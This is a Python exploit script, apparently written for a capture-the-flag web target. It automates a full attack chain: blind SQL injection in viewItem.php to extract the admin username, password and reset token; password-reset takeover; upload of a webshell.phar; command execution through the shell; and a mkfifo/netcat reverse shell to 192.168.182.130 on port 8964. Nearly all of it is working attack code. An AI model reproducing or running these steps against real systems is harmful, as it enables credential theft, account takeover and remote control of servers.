import requests
import time
import sys

ip = ""
myproxy = {
    "http": "http://127.0.0.1:8080",
    "https": "https://127.0.0.1:8080"
}


session = requests.Session()


def get_data(column, size):
    max = size+1
    result = ""
    for i in range(1, max):
        for j in range(32, 127):
            payload = "http://%s/item/viewItem.php?id=1+AND+(SELECT(SELECT+ASCII(SUBSTRING(%s,%d,%d))+FROM+user+WHERE+id_level=1+limit+1)+=+%d)" % (ip, column, i, i, j)
            r = session.get(payload, proxies=myproxy)
            status = int(r.status_code)
            if status == 404:
                result = result + chr(j)
            elif status == 302:
                continue
    
    return result


def post_reset_password(name):
    url = "http://%s/login/resetPassword.php" % (ip)
    data = {
        "username": name,
    }
    response = session.post(url, data=data, allow_redirects=True, proxies=myproxy)
    if "Oops!" in response.text:
        return False
    else:
        return True


def get_do_reset_password(token):
    url = "http://%s/login/doResetPassword.php?token=%s" % (ip, token)
    resposne = session.get(url)
    if "Oops" in resposne.text:
        return False
    else:
        return True


def post_do_change_password(token, pwd):
    url =  "http://%s/login/doChangePassword.php" % (ip)
    data = {
        "token":token,
        "password": pwd
    }
    response = session.post(url, data=data, allow_redirects=True, proxies=myproxy)
    print(response)


def post_check_login(usr, pwd):
    url =  "http://%s/login/checkLogin.php" % (ip)
    data = {
        "username": usr,
        "password": pwd
    }
    print(usr, pwd)
    response = session.post(url, data=data, allow_redirects=True, proxies=myproxy)
    if "FLAG1" in response.text:
        return True
    else:
        return False


def post_udpate_item(filename):
    url =  "http://%s/item/updateItem.php" % (ip)
    data = {
        "id": 1,
        "id_user": 1,
        "name": "Raspery Pi 4",
        "description": "Latest Raspberry Pi 4 Model B with 2/4/8GB RAM raspberry pi 4 BCM2711 Quad core Cortex-A72 ARM v8 1.5GHz Speeder Than Pi 3B",
        "price": 94
    }
    file = {
        "image": open(filename, "rb")
    }
    resposne = session.post(url, files=file, data=data, proxies=myproxy)
    status = int(resposne.status_code)
    if status == 200:
        return True
    else:
        return False


def execute_webshell(filename, command):
    encode_command = command.replace(" ", "+")
    url =  "http://%s/item/image/%s?cmd=%s" % (ip, filename, encode_command)
    response = session.get(url, proxies=myproxy)
    print(response.text)


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("[!] usage: python3 %s <target>" % sys.argv[0])
        print("[!] e.g.: python3 %s 192.168.121.103" % sys.argv[0])
        sys.exit(-1)
    
    ip = sys.argv[1]

    # Get Username
    username = get_data("username", 5)
    if not username:
        print("[!] Retrieve Username Fail")
    else:
        print("[+] Username = ", username)

    # Get Password
    password = get_data("password", 32)
    if not password:
        print("[!] Retrieve Password Fail")
    else:
        print("[+] password = ", password)
    
    # Reset Password
    request_password_reset_link = post_reset_password(username)
    if not request_password_reset_link:
        print("[!] Reset Password Fail")
    else:
        print("[+] Reset Password Succcess")

    # Get token of reset password
    token = get_data("token", 50)
    if not token:
        print("[!] Retrieve Token Fail")
        sys.exit(-1)
    else:
        print("[+] token = ", token)

    # Validate stolen token
    valid_token = get_do_reset_password(token)
    if not valid_token:
        print("[!] Reset token not valid")
        sys.exit(-1)
    else:
        print("[+] Reset token Success")

    # Change Password
    myPassword = "admin"
    post_do_change_password(token, myPassword)

    # Check Admin Session
    # username = "admin"
    # myPassword = "admin"
    login_success = post_check_login(username, myPassword)
    if not login_success:
        print("[!] Login Fail")
        sys.exit(-1)
    else:
        print("[+] Login Success")

    # Upload Webshell
    filename = "webshell.phar"
    upload_success = post_udpate_item(filename)
    if not upload_success:
        print("[!] Upload Fail")
        sys.exit(-1)
    else:
        print("[+] Upload Success")

    # Execute Web Shell
    command = "id"
    execute_webshell(filename, command)

    # Execute Reverse Shell
    command = "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.182.130 8964 >/tmp/f"
    execute_webshell(filename, command)
